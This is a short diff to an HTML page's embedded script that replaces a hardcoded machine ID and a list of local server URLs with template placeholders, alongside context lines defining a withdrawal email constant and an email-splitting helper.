@@ -22,8 +22,8 @@ button{height:38px;border:0;border-radius:10px;padding:0 10px;background:#2563eb
 #status{font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1;color:#e5e7eb}.hidden{display:none!important}
 </style>
 <script>
-const MACHINE = '797';
-const SERVERS = ["http://192.17.1.10:8765", "http://192.16.1.10:8765", "http://192.15.1.10:8765", "http://192.14.1.10:8765", "http://192.168.9.201:8765"];
+const MACHINE = '__MACHINE__';
+const SERVERS = ['http://__TEXT_HOST_IP__:8765'];
 const WITHDRAW_MAIL='trumvtc18@gmail.com';
 window.__mail_set = new Set();
 function splitMail(m){let p=String(m||'jonhsnowgotn@gmail.com').split('@');return {user:p[0]||'jonhsnowgotn',domain:'@'+(p[1]||'gmail.com')};}
